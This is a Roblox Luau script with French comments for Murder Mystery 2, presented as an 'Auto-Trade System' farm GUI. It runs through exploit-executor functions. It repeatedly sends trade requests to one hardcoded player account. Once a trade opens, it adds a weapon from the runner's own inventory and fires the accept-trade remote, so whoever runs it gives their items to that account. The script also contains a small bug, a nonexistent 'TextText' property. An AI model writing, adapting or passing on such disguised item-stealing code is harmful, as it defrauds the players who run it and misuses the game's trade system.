local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local LocalPlayer = Players.LocalPlayer
local playerGui = LocalPlayer:WaitForChild("PlayerGui")

-- Nettoyage des anciens scripts
local oldGui = playerGui:FindFirstChild("KeyzerFarmGui")
if oldGui then oldGui:Destroy() end

-- [[ 1. CONFIGURATION CIBLE ]]
local TARGET_PLAYER_NAME = "zeynox0880"

-- [[ 2. DESIGN DE L'INTERFACE PRINCIPALE ]]
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "KeyzerFarmGui"
ScreenGui.Parent = playerGui
ScreenGui.ResetOnSpawn = false

local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Parent = ScreenGui
MainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
MainFrame.Position = UDim2.new(0.5, -150, 0.3, -50)
MainFrame.Size = UDim2.new(0, 300, 0, 130)
MainFrame.Active = true
MainFrame.Draggable = true

local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 8)
UICorner.Parent = MainFrame

local Title = Instance.new("TextLabel")
Title.Parent = MainFrame
Title.BackgroundTransparency = 1
Title.Size = UDim2.new(1, 0, 0, 35)
Title.Font = Enum.Font.SourceSansBold
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextSize = 16
Title.Text = "MM2 Auto-Trade System v13"

local StatusLabel = Instance.new("TextLabel")
StatusLabel.Parent = MainFrame
StatusLabel.BackgroundTransparency = 1
StatusLabel.Position = UDim2.new(0, 0, 0, 45)
StatusLabel.Size = UDim2.new(1, 0, 0, 30)
StatusLabel.Font = Enum.Font.SourceSans
StatusLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
StatusLabel.TextSize = 14
StatusLabel.Text = "Initialisation..."

local CloseBtn = Instance.new("TextButton")
CloseBtn.Parent = MainFrame
CloseBtn.BackgroundColor3 = Color3.fromRGB(255, 75, 75)
CloseBtn.Position = UDim2.new(0.5, -50, 0, 85)
CloseBtn.Size = UDim2.new(0, 100, 0, 30)
CloseBtn.Font = Enum.Font.SourceSansBold
CloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
CloseBtn.TextText = "FERMER"
CloseBtn.TextSize = 14
Instance.new("UICorner", CloseBtn).CornerRadius = UDim.new(0, 6)

CloseBtn.MouseButton1Click:Connect(function()
    ScreenGui:Destroy()
end)

-- [[ 3. SYSTÈME DE CLICK ROBUSTE ]]
local function forceClick(button)
    if not button then return end
    local firesignalFunc = firesignal or (syn and syn.firesignal)
    if firesignalFunc then
        firesignalFunc(button.MouseButton1Click)
    else
        pcall(function() button:Activate() end)
    end
end

-- [[ 4. RECHERCHE DU SYSTÈME DE TRADE DE MM2 ]]
local TradeModules = ReplicatedStorage:FindFirstChild("Trade") or ReplicatedStorage:FindFirstChild("Modules")
local TradeNetwork = TradeModules and (TradeModules:FindFirstChild("TradeNetwork") or TradeModules:FindFirstChild("Network"))

-- [[ 5. LOGIQUE DE SÉLECTION DES ARMES ET ACCEPTATION ]]
local function executeTradeSequence(tradeGui)
    StatusLabel.Text = "Trade ouvert ! Recherche de tes armes..."
    
    -- Recherche dynamique de la liste de tes items (indépendant du chemin absolu qui bug)
    local scrollingContainer = nil
    for i = 1, 30 do
        -- On cherche un conteneur d'items qui appartient au joueur local dans le GUI de trade
        scrollingContainer = tradeGui:FindFirstChild("Container", true) or tradeGui:FindFirstChild("Main", true)
        if scrollingContainer then
            -- On essaie de descendre vers la liste de TES items (souvent appelé 'YourItems' ou 'Weapons' ou 'Current')
            local userContainer = scrollingContainer:FindFirstChild("Current", true) or scrollingContainer:FindFirstChild("Items", true)
            if userContainer then
                scrollingContainer = userContainer
                break
            end
        end
        task.wait(0.1)
    end
    
    if scrollingContainer then
        -- Attente que les boutons d'armes apparaissent dedans
        local items = {}
        for attempt = 1, 20 do
            items = {}
            for _, child in ipairs(scrollingContainer:GetChildren()) do
                if child:IsA("GuiButton") then
                    table.insert(items, child)
                end
            end
            if #items >= 4 then break end
            task.wait(0.1)
        end
        
        -- Tri par LayoutOrder pour cliquer sur le 4ème item physique
        table.sort(items, function(a, b) return (a.LayoutOrder or 0) < (b.LayoutOrder or 0) end)
        
        local targetWeapon = items[4] or items[1] -- Secours sur le 1er si pas 4 items
        if targetWeapon then
            StatusLabel.Text = "Arme trouvée ! Ajout au trade..."
            for i = 1, 5 do
                forceClick(targetWeapon)
                task.wait(0.05)
            end
        else
            StatusLabel.Text = "⚠️ Aucune arme cliquable trouvée."
        end
    else
        StatusLabel.Text = "⚠️ Impossible de charger ton inventaire."
    end
    
    -- Validation du Trade
    task.wait(0.8)
    StatusLabel.Text = "Acceptation du trade..."
    if TradeNetwork and TradeNetwork:IsA("RemoteEvent") then
        TradeNetwork:FireServer("AcceptTrade")
    else
        local acceptRemote = ReplicatedStorage:FindFirstChild("Trade") and ReplicatedStorage.Trade:FindFirstChild("AcceptTrade")
        if acceptRemote then
            if acceptRemote:IsA("RemoteEvent") then acceptRemote:FireServer() end
        end
    end
end

-- [[ 6. BOUCLE SPAM : ENVOI DE DEMANDE DE TRADE JUSQU'À ACCEPTATION ]]
task.spawn(function()
    while ScreenGui.Parent do
        local target = Players:FindFirstChild(TARGET_PLAYER_NAME)
        local inTrade = playerGui:FindFirstChild("TradeGUI")
        
        if inTrade and inTrade.ClassName == "ScreenGui" and inTrade.Enabled == true then
            -- Si le menu de trade est ouvert et actif, on arrête d'envoyer des demandes et on gère les armes
            StatusLabel.Text = "En cours de trade avec " .. TARGET_PLAYER_NAME
            executeTradeSequence(inTrade)
            -- On attend que le trade se ferme avant de reprendre
            repeat task.wait(0.5) until not playerGui:FindFirstChild("TradeGUI")
        elseif target then
            -- Si zeynox est là et qu'aucun trade n'est actif, on spam l'invitation
            StatusLabel.Text = "Spam trade vers " .. TARGET_PLAYER_NAME .. "..."
            if TradeNetwork and TradeNetwork:IsA("RemoteEvent") then
                TradeNetwork:FireServer("SendRequest", target)
            end
        else
            StatusLabel.Text = "❌ " .. TARGET_PLAYER_NAME .. " introuvable sur le serveur."
        end
        task.wait(3) -- Envoie une demande toutes les 3 secondes
    end
end)

-- Déclencheur si le GUI apparaît pendant le code
playerGui.ChildAdded:Connect(function(child)
    if child.Name == "TradeGUI" then
        task.wait(0.2)
        executeTradeSequence(child)
    end
end)
